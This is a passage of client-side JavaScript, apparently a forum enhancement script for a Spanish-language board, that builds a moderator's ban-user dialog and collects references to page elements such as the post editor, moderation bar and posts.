            var a = '<div class="ban_content" ><div class="ban_comm"><form name="ban_o"><p class="frm-info"></p><fieldset class="frm-set"><dl><dt>(Opcional) por un periodo: </dt><dd><input type="text" name="ban_user_date" class="inputbox tiny"></dd></dl><dl><dt>(Optional) por la siguiente razón:</dt><dd><input type="text" name="ban_user_reason" class="inputbox tiny"></dd></dl><dl><dd><input type="submit" name="confirm" value="Banear" class="enviar_ban" onclick="ops.send_ban_o(this, event);return false"></dd></dl></fieldset></form></div></div></div>';
            //convertir
            ops.box(a, '¿Deseas banear a ' + ops.nombre_perfil);
        },
        setupVar: function () {
            ops.ultimonumeropost = tm && init.last(init.g('.postNumber')).textContent.match(/\d+/g)[0];
            ops.logout = init.g('#logout');
            ops.estadisticas = !pu && estadisticas;
            ops.textarea = (ps || tm || ind || mp) && init.g('#editor-textarea');
            ops.subject = tm && init.g('#editor-subject');
            ops.editor = tm && init.g('#ze-editor');
            ops.send_button = (ps || tm || ind) && init.g('#editor-send-button');
            ops.notice = tm && init.g('.notice')[0];
            ops.download = tm && init.g('.descargar');
            ops.content = tm && init.g('.content')[0];
            ops.author = tm && init.g('.author');
            ops.ze_newtab = (ps || tm || ind) && init.g('#newtab');
            ops.mode_button = tm && init.g('.mode-button')[0];
            ops.modbar = tm && init.g('.modbar')[0];
            ops.maincontent = init.g('#main-content');
            ops.pathbox = tm && init.g('.pathname-box');
            ops.topicactions = init.g('.topic-actions');
            ops.p_Fi = tm && init.g('.post');
        },
    };
console.log('%cSe termino de cargar: ' + ops.checkTime(), colors.blue);
